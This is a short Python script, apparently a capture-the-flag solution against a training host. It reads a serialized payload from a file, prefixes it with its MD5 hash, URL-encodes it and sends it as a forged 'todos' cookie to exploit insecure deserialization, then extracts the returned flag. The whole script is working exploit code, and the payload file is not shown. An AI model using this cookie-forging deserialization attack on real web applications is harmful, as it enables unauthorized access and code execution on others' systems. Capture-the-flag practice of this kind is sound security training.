import hashlib
import requests
import string
import urllib

serialized = open("serialization").read()
hashed_serialized = hashlib.md5(serialized.encode('utf-8')).hexdigest()

base_url = "http://free.training.jinblack.it/"
s = requests.Session()

# Send concatenate hashed_serialized and serialized
concat = hashed_serialized+serialized

# url encode the concat string
concat = urllib.parse.quote(concat)

# Set a cookie named 'todos' with value 'concat'
s.cookies.set('todos', concat)

response = s.get(base_url)
if('flag{' in response.text):
    flag = response.text.split('flag{')[1].split('}')[0]
    print('flag{' + flag + '}')